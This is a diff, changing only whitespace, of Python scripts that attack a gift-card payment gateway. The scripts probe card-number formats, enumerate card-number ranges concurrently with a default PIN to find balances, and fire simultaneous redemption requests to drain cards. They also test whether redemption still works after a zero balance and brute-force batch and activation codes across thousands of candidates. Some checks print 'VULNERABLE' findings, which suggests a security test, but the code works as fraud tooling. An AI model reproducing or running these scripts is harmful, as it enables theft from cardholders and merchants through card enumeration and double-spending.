@@ -68,15 +68,15 @@ def test_card_formats():
         # Sequential patterns
         ("sequential_8", "00000001", "Increment from 1"),
         ("sequential_12", "000000000001", "12-digit sequential"),
-        
+
         # Known retailer BINs (test with low-value cards first)
         ("visa_gift", "4111111111111111", "Test Visa gift card format"),
         ("retailer_known", "1234567890123456", "Common retail format"),
-        
+
         # Check digit patterns
         ("luhn_check", "4111111111111112", "Failed Luhn = pattern test"),
     ]
-    
+
     results = []
     for name, card_num, note in test_patterns:
         try:
@@ -85,10 +85,10 @@ def test_card_formats():
                 json={"card_number": card_num, "pin": "0000"},
                 timeout=10
             )
-            
+
             response_body = r.text
             status = "unknown"
-            
+
             if "not found" in response_body.lower():
                 status = "not_found"
             elif "invalid" in response_body.lower():
@@ -97,12 +97,12 @@ def test_card_formats():
                 status = "valid_format"
             elif "rate" in response_body.lower():
                 status = "rate_limited"
-            
+
             results.append((name, card_num, status, note))
-            
+
         except Exception as e:
             results.append((name, card_num, f"error: {e}", note))
-    
+
     return results
 
 for name, num, status, note in test_card_formats():
@@ -133,7 +133,7 @@ async def check_balance(session, card_num, pin="0000"):
             json={"card_number": card_num, "pin": pin},
             timeout=10
         )
-        
+
         if r.status_code == 200:
             data = r.json()
             balance = data.get('balance', 0)
@@ -155,12 +155,12 @@ async def enumerate_range(start, end, pin="0000"):
         for card_num in range(start, end + 1):
             task = check_balance(session, str(card_num).zfill(16))
             tasks.append(task)
-            
+
             # Batch size limit to avoid overwhelming target
             if len(tasks) >= 50:
                 await asyncio.gather(*tasks)
                 tasks = []
-        
+
         if tasks:
             await asyncio.gather(*tasks)
 
@@ -239,11 +239,11 @@ async def redeem_all_balance(session, card, pin):
             }
         )
         tasks.append(task)
-    
+
     responses = await asyncio.gather(*tasks, return_exceptions=True)
-    
+
     success_count = sum(
-        1 for r in responses 
+        1 for r in responses
         if not isinstance(r, Exception) and r.status_code == 200
     )
     return success_count
@@ -297,31 +297,31 @@ def test_partial_redemption():
     TARGET = "https://target-payment-gateway.com"
     CARD = "1234567812345678"
     PIN = "9999"
-    
+
     # Step 1: Get initial balance
     r = httpx.post(f"{TARGET}/api/gift-card/balance",
                   json={"card_number": CARD, "pin": PIN})
     initial = r.json().get('balance', 0)
     print(f"Initial balance: ${initial}")
-    
+
     # Step 2: Redeem exact amount
     r = httpx.post(f"{TARGET}/api/gift-card/redeem",
                   json={"card_number": CARD, "pin": PIN, "amount": initial})
-    
+
     # Step 3: Try to redeem again (should fail — balance should be 0)
     r = httpx.post(f"{TARGET}/api/gift-card/redeem",
                   json={"card_number": CARD, "pin": PIN, "amount": "0.01"})
-    
+
     if r.status_code == 200:
         print("⚠️  VULNERABLE: Can redeem after zero balance")
         print(f"  Response: {r.text}")
-    
+
     # Step 4: Check remaining balance
     r = httpx.post(f"{TARGET}/api/gift-card/balance",
                   json={"card_number": CARD, "pin": PIN})
     remaining = r.json().get('balance', 0)
     print(f"Remaining balance: ${remaining}")
-    
+
     if float(remaining) > 0:
         print(f"⚠️  VULNERABLE: Balance not zero after full redemption")
 
@@ -395,9 +395,9 @@ with ThreadPoolExecutor(max_workers=20) as executor:
     candidates = [f"BATCH{i:04d}" for i in range(1, 1001)]
     candidates += [f"ACTIVATION{i:06d}" for i in range(1, 10001)]
     candidates += [f"GIFT{i:08d}" for i in range(1000000, 1000100)]
-    
+
     results = list(filter(None, executor.map(check_batch, candidates)))
-    
+
     if results:
         print(f"⚠️  Found {len(results)} activatable batches:")
         for r in results:
